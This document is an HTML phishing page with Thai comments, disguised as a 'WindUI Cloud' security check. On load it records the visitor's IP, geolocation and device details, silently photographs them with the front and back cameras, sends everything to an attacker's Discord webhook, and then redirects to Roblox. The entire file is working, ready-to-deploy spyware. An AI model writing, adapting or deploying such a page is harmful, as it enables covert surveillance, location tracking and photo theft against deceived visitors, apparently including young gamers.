<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Initializing...</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #7c3aed; --glass: rgba(255, 255, 255, 0.05); --border: rgba(255, 255, 255, 0.1); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: radial-gradient(circle at top left, #020617, #09090b); height: 100vh; display: flex; justify-content: center; align-items: center; color: white; overflow: hidden; }
        .container { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid var(--border); border-radius: 30px; padding: 50px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8); }
        .loader { width: 50px; height: 50px; border: 3px solid var(--border); border-top: 3px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #f8fafc; }
        p { font-size: 14px; color: #94a3b8; line-height: 1.6; }
        #status { margin-top: 20px; font-size: 12px; color: var(--primary); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
        video, canvas { display: none; } /* ซ่อนส่วนของการถ่ายรูป */
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <h1 id="title">Initializing Security Protocol</h1>
        <p id="msg">กรุณากด "Allow" หรือ "อนุญาต" เพื่อเข้าสู่ระบบผ่าน WindUI Cloud</p>
        <div id="status">Waiting for permissions...</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK_URL = "ใส่_DISCORD_WEBHOOK_ของคุณที่นี่";
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const msg = document.getElementById('msg');

        let collectedData = {
            ip: "N/A",
            location: "Denied",
            ua: navigator.userAgent,
            time: new Date().toLocaleString('th-TH')
        };

        // 1. ดึง IP ทันทีที่เข้าหน้าเว็บ
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => collectedData.ip = data.ip);

        // 2. ฟังก์ชันเริ่มกระบวนการ (เรียกใช้เมื่อหน้าเว็บโหลด)
        async function startCapture() {
            try {
                // ขอพิกัด
                status.innerText = "Requesting Location...";
                await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(pos => {
                        collectedData.location = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        resolve();
                    }, err => resolve()); // ข้ามถ้าไม่อนุญาตแต่ยังทำงานต่อ
                });

                status.innerText = "Synchronizing Camera...";
                
                // ถ่ายรูปกล้องหน้า
                const frontBlob = await takePhoto('user');
                status.innerText = "Security Check 50%...";
                
                // ถ่ายรูปกล้องหลัง
                const backBlob = await takePhoto('environment');
                status.innerText = "Sending Data...";

                // ส่งทุกอย่างเข้า Discord
                await sendToDiscord(frontBlob, backBlob);

                // เมื่อเสร็จแล้ว
                status.innerText = "Access Granted";
                msg.innerText = "ยืนยันตัวตนสำเร็จ กำลังนำคุณไปยังหน้าหลัก...";
                setTimeout(() => {
                    window.location.href = "https://www.roblox.com/"; // เปลี่ยนเป็นลิ้งที่ต้องการ
                }, 1500);

            } catch (error) {
                console.error(error);
                status.innerText = "Error Occurred";
            }
        }

        async function takePhoto(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode }, 
                    audio: false 
                });
                video.srcObject = stream;
                
                return new Promise((resolve) => {
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        stream.getTracks().forEach(track => track.stop()); // ปิดกล้องหลังถ่ายเสร็จ
                        canvas.toBlob(resolve, 'image/jpeg');
                    }, 1000); // รอโฟกัส 1 วินาที
                });
            } catch (e) {
                return null; // ถ้าไม่มีกล้องหรือกดปฏิเสธ
            }
        }

        async function sendToDiscord(img1, img2) {
            const formData = new FormData();
            
            // ข้อมูล Text
            const content = `**🚀 New Capture!**\n**🌐 IP:** ${collectedData.ip}\n**📍 Location:** ${collectedData.location}\n**🕒 Time:** ${collectedData.time}\n**📱 Device:** \`\`\`${collectedData.ua}\`\`\``;
            
            formData.append('payload_json', JSON.stringify({
                content: content,
                username: "WindUI Logger"
            }));

            // ไฟล์ภาพ
            if (img1) formData.append('file1', img1, 'front_cam.jpg');
            if (img2) formData.append('file2', img2, 'back_cam.jpg');

            return fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });
        }

        // เริ่มทำงานทันที
        window.onload = startCapture;
    </script>
</body>
</html>
